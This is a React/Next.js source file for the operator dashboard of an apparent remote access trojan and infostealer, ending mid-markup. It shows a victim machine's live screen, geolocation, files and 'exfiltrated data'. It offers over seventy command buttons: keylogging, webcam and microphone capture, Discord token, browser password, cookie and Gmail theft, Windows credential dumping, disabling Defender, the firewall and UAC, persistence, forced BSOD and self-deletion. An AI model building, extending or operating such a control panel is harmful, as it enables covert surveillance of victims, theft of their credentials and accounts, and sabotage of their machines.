'use client'

import { useState, useEffect, useRef, useCallback } from "react"
import { motion, AnimatePresence } from "framer-motion"
import { Button, Badge } from "@/components/ui"
import { useParams, useRouter } from "next/navigation"
import toast from "react-hot-toast"
import dynamic from "next/dynamic"

const MapComponent = dynamic(() => import("./MapView"), { ssr: false })

export default function ClientDetailPage() {
  const params = useParams()
  const router = useRouter()
  const [client, setClient] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [activeTab, setActiveTab] = useState<"overview" | "screen" | "terminal" | "screenshots" | "basedata" | "explorer" | "activity" | "map" | "data" | "files">("screen")
  const [command, setCommand] = useState("")
  const [commandHistory, setCommandHistory] = useState<any[]>([])
  const [sending, setSending] = useState(false)
  const terminalRef = useRef<HTMLDivElement>(null)

  function formatDate(dateStr: string): string {
    return new Date(dateStr).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", second: "2-digit" })
  }

  // Screen stream
  const [screenshot, setScreenshot] = useState<string | null>(null)
  const [screenshotTime, setScreenshotTime] = useState("")
  const [streaming, setStreaming] = useState(false)
  const streamRef = useRef<ReturnType<typeof setInterval> | null>(null)

  // Geo
  const [geo, setGeo] = useState<any>(null)
  // Exfiltrated data
  const [exfilData, setExfilData] = useState<any[]>([])
  const [exfilByType, setExfilByType] = useState<Record<string, any[]>>({})
  const [exfilLoading, setExfilLoading] = useState(false)
  // File explorer state
  const [filePath, setFilePath] = useState("C:\\")
  const [fileOutput, setFileOutput] = useState("")
  const [fileLoading, setFileLoading] = useState(false)

  const fetchClient = useCallback(async () => {
    if (!params.id) return
    const res = await fetch(`/api/remote/clients/${params.id}`)
    if (!res.ok) return
    const data = await res.json()
    setClient(data.client)
    setCommandHistory((data.client?.commands || []).slice(0, 100))
    if (data.client?.screenCaptures?.length) {
      setScreenshot(data.client.screenCaptures[0].imagePath || null)
    }
  }, [params.id])

  useEffect(() => { fetchClient().finally(() => setLoading(false)) }, [fetchClient])

  useEffect(() => {
    if (!client?.ipPublic) return
    fetch(`/api/remote/clients/${params.id}/geo`).then(r => r.json()).then(setGeo).catch(() => {})
  }, [client?.ipPublic, params.id])

  function fetchExfilData() {
    if (!params.id) return
    setExfilLoading(true)
    fetch(`/api/remote/clients/${params.id}/data`)
      .then(r => r.json())
      .then(d => { setExfilData(d.data || []); setExfilByType(d.byType || {}) })
      .catch(() => {})
      .finally(() => setExfilLoading(false))
  }

  useEffect(() => {
    if ((activeTab === "basedata") && params.id) fetchExfilData()
  }, [activeTab, params.id])

  // Auto-refresh every 15s
  useEffect(() => {
    const t = setInterval(fetchClient, 15000)
    return () => clearInterval(t)
  }, [fetchClient])

  // Screen stream
  function toggleStream() {
    if (streaming) {
      if (streamRef.current) { clearInterval(streamRef.current); streamRef.current = null }
      setStreaming(false)
      sendCommand("!livestream off")
      return
    }
    setStreaming(true)
    sendCommand("!livestream on")
    // Update live frame every 500ms
    let frameVersion = 0
    function updateFrame() {
      frameVersion++
      setScreenshot(`/api/remote/clients/${params.id}/live-frame?v=${frameVersion}`)
      setScreenshotTime(new Date().toLocaleTimeString())
    }
    updateFrame()
    streamRef.current = setInterval(updateFrame, 500)
  }

  useEffect(() => {
    return () => { if (streamRef.current) clearInterval(streamRef.current) }
  }, [])

  async function listDirectory(path: string) {
    setFileLoading(true)
    setFileOutput("")
    try {
      const res = await fetch(`/api/remote/clients/${params.id}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: `!dir ${path}` }),
      })
      if (!res.ok) throw new Error("Failed")
      const data = await res.json()
      setFileOutput(data.output || "No output")
    } catch {
      toast.error("Failed to list directory")
    } finally { setFileLoading(false) }
  }

  useEffect(() => {
    if (activeTab === "explorer" && params.id) listDirectory(filePath)
  }, [activeTab, filePath, params.id])

  function navigateTo(path: string) {
    setFilePath(path)
    listDirectory(path)
  }

  function goUp() {
    const parent = filePath.split("\\").slice(0, -1).join("\\") || "C:\\"
    navigateTo(parent)
  }

  async function sendCommand(cmd: string) {
    if (!cmd.trim()) return
    setSending(true)
    try {
      const res = await fetch(`/api/remote/clients/${params.id}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: cmd }),
      })
      if (!res.ok) throw new Error("Failed")
      const data = await res.json()
      const cmdId = data.command?.id || Date.now().toString()
      toast.success(`Sent: ${cmd.substring(0, 30)}`)
      setCommandHistory(prev => [{ id: cmdId, command: cmd, status: "pending", executedAt: new Date().toISOString() }, ...prev])
      setCommand("")
      // Poll for command result
      pollCommandResult(cmdId)
    } catch {
      toast.error("Failed to send command")
    } finally {
      setSending(false)
    }
  }

  async function pollCommandResult(cmdId: string) {
    let attempts = 0
    const poll = setInterval(async () => {
      attempts++
      if (attempts > 20) { clearInterval(poll); return }
      try {
        const res = await fetch(`/api/remote/clients/${params.id}`)
        const d = await res.json()
        const cmd = d.client?.commands?.find((c: any) => c.id === cmdId)
        if (cmd && cmd.status !== "pending") {
          clearInterval(poll)
          setCommandHistory(prev => prev.map(c => c.id === cmdId ? { ...c, status: cmd.status, output: cmd.output } : c))
          if (cmd.status === "completed") toast.success("Command completed")
          else if (cmd.status === "failed") toast.error("Command failed")
        }
      } catch {}
    }, 3000)
  }

  if (loading) {
    return (
      <div className="space-y-6">
        <div className="h-8 w-48 bg-muted rounded animate-pulse" />
        <div className="h-[500px] bg-muted rounded-xl animate-pulse" />
      </div>
    )
  }

  if (!client) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-center">
          <p className="text-muted-foreground">Client not found</p>
          <Button onClick={() => router.push("/dashboard/remote/clients")} className="mt-4">Back</Button>
        </div>
      </div>
    )
  }

  const isOnline = (() => {
    if (!client.lastHeartbeat) return false
    return (Date.now() - new Date(client.lastHeartbeat).getTime()) / 1000 <= 90
  })()
  const flagEmoji = (() => { try { const c=client.countryCode?.toUpperCase()||""; return c.length===2?String.fromCodePoint(0x1F1E6+c.charCodeAt(0)-65,0x1F1E6+c.charCodeAt(1)-65):"" } catch { return "" } })()

  const tabs = [
    { id: "screen" as const, label: "Live", icon: "M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" },
    { id: "overview" as const, label: "Overview", icon: "M4 6h16M4 12h16M4 18h16" },
    { id: "terminal" as const, label: "Commands", icon: "M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z M14 2v6h6" },
    { id: "explorer" as const, label: "Files", icon: "M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z" },
    { id: "activity" as const, label: "Activity", icon: "M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" },
    { id: "screenshots" as const, label: "Gallery", icon: "M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01" },
    { id: "basedata" as const, label: "Session", icon: "M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" },
  ]

  return (
    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
      {/* Header */}
      <div className="flex items-center justify-between flex-wrap gap-2">
        <div className="flex items-center gap-3">
          <button onClick={() => router.push("/dashboard/remote/clients")} className="w-8 h-8 rounded-lg hover:bg-zinc-800 flex items-center justify-center transition-colors">
            <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M19 12H5m7-7l-7 7 7 7"/></svg>
          </button>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-xl font-bold text-white">{client.hostname || client.clientId?.substring(0, 8)}</h1>
              {flagEmoji && <span className="text-lg">{flagEmoji}</span>}
              <Badge variant={isOnline ? "success" : "secondary"} className="text-[10px]">
                {isOnline ? "ONLINE" : "OFFLINE"}
              </Badge>
            </div>
            <p className="text-xs text-zinc-400">{client.ipPublic} · {client.os} · {client.user || "unknown"}</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <Button size="sm" onClick={() => router.push("/dashboard/remote/clients")}>Back to Clients</Button>
        </div>
      </div>

      {/* Tab Bar */}
      <div className="flex gap-1 p-1 bg-card/60 backdrop-blur-sm rounded-2xl w-fit border border-border/50 overflow-x-auto">
        {tabs.map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-medium transition-all whitespace-nowrap ${
              activeTab === tab.id ? "bg-primary/20 text-primary" : "text-muted-foreground hover:text-foreground"
            }`}
          >
            <svg className="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d={tab.icon} />
            </svg>
            {tab.label}
          </button>
        ))}
      </div>

      {/* SCREEN TAB - Large live view */}
      {activeTab === "screen" && (
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <h2 className="text-sm font-semibold uppercase tracking-wider text-muted-foreground">Live Stream</h2>
              {streaming && (
                <span className="flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-red-500/10 border border-red-500/20 text-[10px] text-red-400 font-bold">
                  <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
                  LIVE
                </span>
              )}
            </div>
            <div className="flex items-center gap-3">
              {screenshotTime && <span className="text-[10px] text-muted-foreground">{screenshotTime}</span>}
              <Button size="sm" onClick={toggleStream} variant={streaming ? "danger" : "primary"}>
                {streaming ? "⬛ Stop" : "▶ Start Stream"}
              </Button>
            </div>
          </div>
          {screenshot ? (
            <div className="rounded-xl border border-border/50 bg-black overflow-hidden">
              <img
                src={screenshot}
                alt="Live Stream"
                className="w-full h-auto max-h-[75vh] object-contain"
              />
            </div>
          ) : (
            <div className="rounded-xl border border-border/50 bg-card/60 flex items-center justify-center h-[400px]">
              <div className="text-center space-y-3">
                <span className="text-6xl block">📺</span>
                <p className="text-muted-foreground">No screen capture yet</p>
                <Button size="sm" onClick={async () => {
                  toast.success("Requesting screenshot...")
                  await sendCommand("!screenshot")
                  setTimeout(async () => {
                    const r = await fetch(`/api/remote/clients/${params.id}/screenshot`)
                    const d = await r.json()
                    if (d.screenshots?.length) {
                      const last = d.screenshots[0]
                      if (last.imagePath) { setScreenshot(last.imagePath); setScreenshotTime(formatDate(last.createdAt)) }
                    }
                  }, 3000)
                }}>Request Screenshot</Button>
              </div>
            </div>
          )}
        </div>
      )}

      {/* MAP TAB */}
      {activeTab === "map" && (
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <h2 className="text-sm font-semibold uppercase tracking-wider text-zinc-400">Geolocation</h2>
            {geo && <span className="text-xs text-zinc-400">{geo.city}, {geo.country}</span>}
          </div>
          <div className="rounded-xl border border-zinc-800 overflow-hidden h-[450px]">
            <MapComponent lat={geo?.lat || 0} lng={geo?.lng || 0} label={client.hostname || client.clientId} />
          </div>
          {geo && geo.lat !== 0 && (
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
              {[
                { label: "City", value: geo.city },
                { label: "Country", value: `${geo.country} ${flagEmoji}` },
                { label: "ISP", value: geo.isp },
                { label: "Timezone", value: geo.timezone },
              ].map(item => (
                <div key={item.label} className="p-3 rounded-xl border border-zinc-800 bg-zinc-900/60">
                  <p className="text-[10px] text-zinc-500 uppercase">{item.label}</p>
                  <p className="text-sm text-white font-medium truncate">{item.value || "-"}</p>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* OVERVIEW TAB */}
      {activeTab === "overview" && (
        <div className="grid md:grid-cols-2 gap-4">
          {/* System Info */}
          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">System</h3>
            <div className="space-y-2">
              {[
                { label: "Hostname", value: client.hostname },
                { label: "User", value: client.user },
                { label: "OS", value: client.os },
                { label: "Version", value: client.version },
                { label: "Client ID", value: client.clientId },
                { label: "Screen", value: client.screenWidth ? `${client.screenWidth}x${client.screenHeight}` : "-" },
              ].map(item => (
                <div key={item.label} className="flex justify-between text-xs"><span className="text-zinc-500">{item.label}</span><span className="font-mono text-zinc-300">{item.value || "-"}</span></div>
              ))}
            </div>
          </div>

          {/* Performance */}
          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">Performance</h3>
            <div className="space-y-3">
              <div>
                <div className="flex justify-between text-xs mb-1"><span className="text-zinc-500">CPU</span><span className="font-mono text-zinc-300">{client.cpu != null ? `${client.cpu.toFixed(1)}%` : "-"}</span></div>
                <div className="h-1.5 bg-zinc-800 rounded-full"><div className="h-full rounded-full bg-primary transition-all" style={{ width: `${client.cpu || 0}%` }} /></div>
              </div>
              <div>
                <div className="flex justify-between text-xs mb-1"><span className="text-zinc-500">RAM</span><span className="font-mono text-zinc-300">{client.ramTotal ? `${(client.ramUsed || 0).toFixed(1)} / ${client.ramTotal.toFixed(1)} GB` : "-"}</span></div>
                <div className="h-1.5 bg-zinc-800 rounded-full"><div className="h-full rounded-full bg-green-500 transition-all" style={{ width: client.ramTotal ? `${((client.ramUsed || 0) / client.ramTotal) * 100}%` : "0%" }} /></div>
              </div>
            </div>
          </div>

          {/* Network */}
          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">Network</h3>
            <div className="space-y-2">
              {[
                { label: "Public IP", value: client.ipPublic },
                { label: "Local IP", value: client.ipLocal },
                { label: "Country", value: `${flagEmoji} ${client.country || "-"}` },
                { label: "ISP", value: client.isp },
                { label: "First Seen", value: new Date(client.firstSeen).toLocaleDateString() },
                { label: "Last Seen", value: new Date(client.lastSeen).toLocaleString() },
              ].map(item => (
                <div key={item.label} className="flex justify-between text-xs"><span className="text-zinc-500">{item.label}</span><span className="font-mono text-zinc-300 truncate ml-2">{item.value || "-"}</span></div>
              ))}
            </div>
          </div>

          {/* Quick Actions */}
          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">Quick Actions</h3>
            <div className="grid grid-cols-2 gap-2">
              {[
                { label: "Screenshot", cmd: "!screenshot", emoji: "📸" },
                { label: "System Info", cmd: "!sysinfo", emoji: "🖥️" },
                { label: "Start Stream", cmd: "", emoji: "📺", action: () => { setActiveTab("screen"); toggleStream() } },
                { label: "Geolocate", cmd: "!geolocate", emoji: "📍" },
                { label: "Beep", cmd: "!beep", emoji: "🔊" },
              ].map(item => (
                <button
                  key={item.label}
                  onClick={() => item.action ? item.action() : sendCommand(item.cmd)}
                  className="p-2.5 rounded-lg border border-zinc-700 bg-zinc-800/50 hover:bg-zinc-700/50 transition-all text-xs text-left flex items-center gap-2"
                >
                  <span>{item.emoji}</span>
                  <span className="font-medium text-zinc-300">{item.label}</span>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* COMMANDS TAB — Card Grid Layout */}
      {activeTab === "terminal" && (
        <div className="space-y-5">
          {/* Search */}
          <div className="relative">
            <svg className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
            <input
              type="text"
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              placeholder="Search 70+ commands..."
              className="w-full pl-10 pr-4 py-3 rounded-2xl border border-border/50 bg-card/60 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:border-primary/50 transition-all"
            />
          </div>

          {/* CATEGORIES */}
          {[
            {
              title: "System Administration", icon: "⚙️", color: "border-l-primary",
              desc: "Device power, lock, and management", items: [
                { cmd: "!shutdown", label: "Shutdown", desc: "Power off the remote device", icon: "⏻" },
                { cmd: "!restart", label: "Restart", desc: "Reboot the remote device", icon: "🔄" },
                { cmd: "!logoff", label: "Sign Out", desc: "Log off current user session", icon: "🚪" },
                { cmd: "!lock", label: "Lock Device", desc: "Lock the workstation", icon: "🔒" },
                { cmd: "!bluescreen", label: "Blue Screen", desc: "Trigger BSOD on remote device", icon: "💀" },
                { cmd: "!beep", label: "Test Sound", desc: "Play audible beep on device", icon: "🔊" },
                { cmd: "!elevate", label: "Elevate", desc: "Attempt admin privilege elevation", icon: "⬆️" },
                { cmd: "!disableuac", label: "Disable UAC", desc: "Turn off User Account Control", icon: "🛡️" },
              ]
            },
            {
              title: "Input Control", icon: "🖱️", color: "border-l-warning",
              desc: "Block/unblock input and task manager", items: [
                { cmd: "!block", label: "Block Input", desc: "Freeze keyboard and mouse", icon: "🧊" },
                { cmd: "!unblock", label: "Unblock Input", desc: "Restore keyboard and mouse", icon: "♨️" },
                { cmd: "!disabletaskmgr", label: "Disable Task Mgr", desc: "Prevent Task Manager access", icon: "🚫" },
                { cmd: "!enabletaskmgr", label: "Enable Task Mgr", desc: "Restore Task Manager access", icon: "✅" },
              ]
            },
            {
              title: "Surveillance", icon: "👁️", color: "border-l-destructive",
              desc: "Screen, webcam, keylog, microphone", items: [
                { cmd: "!screenshot", label: "Screenshot", desc: "Capture remote screen now", icon: "📸" },
                { cmd: "!webcampic", label: "Webcam Photo", desc: "Snap picture from webcam", icon: "📷" },
                { cmd: "!keylog", label: "Keylogger", desc: "Start keystroke recording", icon: "⌨️" },
                { cmd: "!clipboard", label: "Clipboard", desc: "Read clipboard contents", icon: "📋" },
                { cmd: "!idletime", label: "Idle Time", desc: "Check user idle duration", icon: "💤" },
                { cmd: "!mic", label: "Microphone", desc: "Capture audio from mic", icon: "🎙️" },
                { cmd: "!getcams", label: "List Webcams", desc: "Enumerate available cameras", icon: "📹" },
              ]
            },
            {
              title: "File System", icon: "📁", color: "border-l-green-500",
              desc: "Browse, download, upload, execute files", items: [
                { cmd: "!dir", label: "List Files", desc: "List directory contents", icon: "📂" },
                { cmd: "!currentdir", label: "Current Dir", desc: "Show working directory", icon: "📍" },
                { cmd: "!download", label: "Download File", desc: "Download file from device", icon: "⬇️" },
                { cmd: "!upload", label: "Upload File", desc: "Send file to device", icon: "⬆️" },
                { cmd: "!delete", label: "Delete File", desc: "Remove file from device", icon: "🗑️" },
                { cmd: "!execute", label: "Execute File", desc: "Run executable on device", icon: "▶️" },
                { cmd: "!write", label: "Write File", desc: "Create text file on device", icon: "✏️" },
                { cmd: "!cd", label: "Change Dir", desc: "Navigate to a folder", icon: "📌" },
              ]
            },
            {
              title: "Process & System", icon: "💻", color: "border-l-blue-500",
              desc: "Monitor and control processes", items: [
                { cmd: "!listprocess", label: "List Processes", desc: "Show running processes", icon: "📊" },
                { cmd: "!prockill", label: "Kill Process", desc: "Terminate a process by name", icon: "❌" },
                { cmd: "!sysinfo", label: "System Info", desc: "Full system specifications", icon: "🖥️" },
                { cmd: "!admincheck", label: "Admin Check", desc: "Check if running as admin", icon: "👑" },
                { cmd: "!publicip", label: "Public IP", desc: "Show device public IP", icon: "🌐" },
              ]
            },
            {
              title: "Data Collection", icon: "🕵️", color: "border-l-purple-500",
              desc: "Gather credentials, tokens, and info", items: [
                { cmd: "!grabtokens", label: "Grab Tokens", desc: "Extract Discord tokens", icon: "🎫" },
                { cmd: "!steal", label: "Steal All", desc: "Collect all credentials and data", icon: "🕶️" },
                { cmd: "!wifi", label: "WiFi Passwords", desc: "Extract saved WiFi keys", icon: "📶" },
                { cmd: "!browserpasswords", label: "Browser Passwords", desc: "Extract saved browser logins", icon: "🔐" },
                { cmd: "!password", label: "Windows Passwords", desc: "Dump Windows credentials", icon: "🔑" },
                { cmd: "!discordinfo", label: "Discord Info", desc: "Gather Discord account data", icon: "💬" },
              ]
            },
            {
              title: "Security", icon: "🛡️", color: "border-l-red-500",
              desc: "Disable defenses and extract security info", items: [
                { cmd: "!disabledefender", label: "Disable Defender", desc: "Turn off Windows Defender", icon: "🛑" },
                { cmd: "!disablefirewall", label: "Disable Firewall", desc: "Turn off Windows Firewall", icon: "🔥" },
                { cmd: "!uacbypass", label: "UAC Bypass", desc: "Bypass User Account Control", icon: "⚡" },
              ]
            },
            {
              title: "Network & Geolocation", icon: "🌍", color: "border-l-cyan-500",
              desc: "IP and network reconnaissance", items: [
                { cmd: "!ipinfo", label: "IP Info", desc: "Detailed IP intelligence", icon: "🔎" },
                { cmd: "!geolocate", label: "Geolocate", desc: "Get device GPS coordinates", icon: "📍" },
                { cmd: "!message", label: "Message Box", desc: "Show popup message on device", icon: "💬" },
                { cmd: "!voice", label: "Voice Speak", desc: "Text-to-speech on device", icon: "🗣️" },
              ]
            },
            {
              title: "Apps & Games", icon: "🎮", color: "border-l-yellow-500",
              desc: "Steam, Telegram, email clients", items: [
                { cmd: "!steam", label: "Steam Info", desc: "Gather Steam account data", icon: "🎮" },
                { cmd: "!telegram", label: "Telegram Info", desc: "Find Telegram sessions", icon: "✈️" },
                { cmd: "!email", label: "Email Clients", desc: "Detect email applications", icon: "📧" },
              ]
            },
            {
              title: "Persistence", icon: "🔗", color: "border-l-orange-500",
              desc: "Install or remove persistence", items: [
                { cmd: "!startup", label: "Add to Startup", desc: "Install registry + folder persistence", icon: "🚀" },
                { cmd: "!critproc", label: "Critical Process", desc: "Set as critical (BSOD if killed)", icon: "💥" },
                { cmd: "!uncritproc", label: "Uncritical", desc: "Remove critical process flag", icon: "🔓" },
                { cmd: "!hide", label: "Hide Process", desc: "Hide window + apply stealth", icon: "👻" },
                { cmd: "!unhide", label: "Show Process", desc: "Restore visibility", icon: "👁️" },
              ]
            },
            {
              title: "Malware", icon: "🦠", color: "border-l-red-600",
              desc: "Information stealing, credential harvesting, full data exfiltration", items: [
                { cmd: "!virus", label: "Virus — Steal All", desc: "Execute full info stealer: tokens, passwords, cookies, browser data, everything", icon: "🦠" },
                { cmd: "!stealall", label: "Steal All Data", desc: "Grab Discord tokens + browser passwords + cookies + system info in one shot", icon: "🕶️" },
                { cmd: "!discordtokengrab", label: "Discord Token Grab", desc: "Extract all Discord tokens from leveldb and validate them", icon: "💬" },
                { cmd: "!passwordsgrabber", label: "Password Grabber", desc: "Steal saved passwords from Chrome, Edge, Brave, Firefox", icon: "🔑" },
                { cmd: "!cookiestealer", label: "Cookie Stealer", desc: "Steal browser cookies: session, auth, Roblox, Google, Discord", icon: "🍪" },
                { cmd: "!robloxcookies", label: "Roblox Cookie Stealer", desc: "Extract .ROBLOSECURITY cookie from all browsers", icon: "🎮" },
                { cmd: "!gmailstealer", label: "Gmail Stealer", desc: "Steal Google/Gmail session cookies and account info", icon: "📧" },
                { cmd: "!browserpasswords", label: "Browser Passwords", desc: "Extract saved login credentials from all browsers", icon: "🔐" },
                { cmd: "!grabtokens", label: "Grab Tokens", desc: "Extract Discord tokens and upload to Data Base", icon: "🎫" },
                { cmd: "!wifi", label: "WiFi Passwords", desc: "Extract all saved WiFi network passwords", icon: "📶" },
                { cmd: "!password", label: "Windows Passwords", desc: "Dump Windows Credential Manager and local user hashes", icon: "🗝️" },
                { cmd: "!steamgrabber", label: "Steam Stealer", desc: "Steal Steam account info, config files, SSFN tokens", icon: "🎮" },
                { cmd: "!discordinfo", label: "Discord Info", desc: "Gather Discord installation info, settings, running processes", icon: "💬" },
                { cmd: "!exit", label: "Exit Client", desc: "Close client after data exfiltration complete", icon: "🛑" },
                { cmd: "!killswitch", label: "Kill Switch", desc: "Self-delete client after stealing data", icon: "🔥" },
              ]
            },
          ].map((cat) => {
            // Filter by search
            const filtered = command.trim()
              ? cat.items.filter(i =>
                  i.label.toLowerCase().includes(command.toLowerCase()) ||
                  i.cmd.toLowerCase().includes(command.toLowerCase()) ||
                  i.desc.toLowerCase().includes(command.toLowerCase())
                )
              : cat.items
            if (filtered.length === 0) return null
            return (
              <div key={cat.title} className="rounded-2xl border border-border/50 bg-card/60 overflow-hidden">
                <div className={`p-4 border-l-4 ${cat.color} bg-muted/20`}>
                  <div className="flex items-center gap-2">
                    <span className="text-xl">{cat.icon}</span>
                    <div>
                      <h3 className="text-sm font-bold text-foreground">{cat.title}</h3>
                      <p className="text-[10px] text-muted-foreground">{cat.desc}</p>
                    </div>
                    <span className="ml-auto text-[10px] text-muted-foreground">{filtered.length}</span>
                  </div>
                </div>
                <div className="p-3 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-2">
                  {filtered.map((item) => {
                    const busy = sending && command === item.cmd
                    return (
                      <button
                        key={item.cmd}
                        onClick={() => sendCommand(item.cmd)}
                        disabled={sending}
                        className={`relative text-left p-3 rounded-xl border border-border/40 bg-card/40 hover:bg-muted/30 hover:border-primary/30 hover:scale-[1.02] transition-all duration-200 group ${
                          busy ? "opacity-70" : ""
                        }`}
                      >
                        {busy ? (
                          <div className="w-3.5 h-3.5 border-2 border-muted-foreground/30 border-t-primary rounded-full animate-spin absolute top-2 right-2" />
                        ) : null}
                        <span className="text-2xl block mb-1.5 group-hover:scale-110 transition-transform inline-block">{item.icon}</span>
                        <p className="text-[11px] font-semibold text-foreground">{item.label}</p>
                        <p className="text-[9px] text-muted-foreground mt-0.5 line-clamp-2">{item.desc}</p>
                        <code className="text-[9px] text-primary/30 font-mono mt-1 block group-hover:text-primary/60 transition-colors">{item.cmd}</code>
                      </button>
                    )
                  })}
                </div>
              </div>
            )
          })}

          {/* Command History */}
          <div className="rounded-2xl border border-border/50 bg-card/60 overflow-hidden">
            <div className="p-4 border-b border-border/30 flex items-center justify-between">
              <h3 className="text-xs font-semibold text-muted-foreground uppercase tracking-wider">History ({commandHistory.length})</h3>
            </div>
            <div className="bg-black/30 rounded-b-2xl p-4 font-mono text-xs max-h-60 overflow-y-auto space-y-1.5">
              {commandHistory.length === 0 ? (
                <span className="text-muted-foreground/30">No commands sent yet. Click any button above.</span>
              ) : (
                commandHistory.map((cmd: any, i: number) => (
                  <div key={i} className="flex items-start gap-2">
                    <span className="text-green-400 shrink-0">$</span>
                    <div className="min-w-0 flex-1">
                      <span className="text-foreground/80">{cmd.command}</span>
                      {cmd.output && (
                        <pre className="text-muted-foreground text-[10px] mt-0.5 whitespace-pre-wrap break-all max-h-16 overflow-y-auto">{typeof cmd.output === 'string' ? cmd.output.substring(0, 300) : ""}</pre>
                      )}
                    </div>
                    <span className="text-muted-foreground/30 text-[10px] shrink-0">{formatDate(cmd.executedAt)}</span>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      )}

      {/* SCREENSHOTS GALLERY TAB */}
      {activeTab === "screenshots" && (
        <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider">Screen Captures ({client.screenCaptures?.length || 0})</h3>
            <Button size="sm" onClick={() => sendCommand("!screenshot")}>New Screenshot</Button>
          </div>
          {!client.screenCaptures?.length ? (
            <div className="text-center py-12 text-zinc-500">No screenshots yet</div>
          ) : (
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
              {client.screenCaptures?.map((sc: any) => (
                <div key={sc.id} className="rounded-lg border border-zinc-800 overflow-hidden hover:border-zinc-600 transition-colors cursor-pointer" onClick={() => { setScreenshot(sc.imagePath); setActiveTab("screen") }}>
                  {sc.imagePath ? (
                    <img src={sc.imagePath} alt="Screenshot" className="w-full aspect-video object-cover" />
                  ) : (
                    <div className="w-full aspect-video bg-zinc-800 flex items-center justify-center text-zinc-600 text-xs">Pending</div>
                  )}
                  <div className="p-2 text-[10px] text-zinc-500 flex justify-between">
                    <span>{sc.width}x{sc.height}</span>
                    <span>{formatDate(sc.createdAt)}</span>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* FILES TAB */}
      {activeTab === "files" && (
        <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
          <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-4">File Transfers ({client.fileTransfers?.length || 0})</h3>
          {!client.fileTransfers?.length ? (
            <div className="text-center py-8 text-zinc-500">No file transfers yet</div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-xs">
                <thead>
                  <tr className="border-b border-zinc-800 text-zinc-500">
                    <th className="text-left p-2">File</th>
                    <th className="text-left p-2">Dir</th>
                    <th className="text-left p-2">Size</th>
                    <th className="text-left p-2">Status</th>
                    <th className="text-left p-2">Date</th>
                  </tr>
                </thead>
                <tbody>
                  {client.fileTransfers?.map((ft: any) => (
                    <tr key={ft.id} className="border-b border-zinc-800/50 hover:bg-zinc-800/30">
                      <td className="p-2 font-mono text-zinc-300">{ft.fileName}</td>
                      <td className="p-2"><Badge variant={ft.direction === "upload" ? "primary" : "warning"} className="text-[10px]">{ft.direction}</Badge></td>
                      <td className="p-2 text-zinc-400">{ft.fileSize ? `${(ft.fileSize / 1024).toFixed(1)}KB` : "-"}</td>
                      <td className="p-2"><Badge variant={ft.status === "completed" ? "success" : ft.status === "failed" ? "danger" : "warning"} className="text-[10px]">{ft.status}</Badge></td>
                      <td className="p-2 text-zinc-500">{new Date(ft.startedAt).toLocaleDateString()}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* DATA TAB — Exfiltrated Information */}
      {activeTab === "data" && (
        <div className="space-y-4">
          <div className="flex items-center justify-between">
            <h2 className="text-sm font-semibold uppercase tracking-wider text-zinc-400">🕵️ Exfiltrated Data</h2>
            <Button size="sm" onClick={fetchExfilData} loading={exfilLoading}>Refresh</Button>
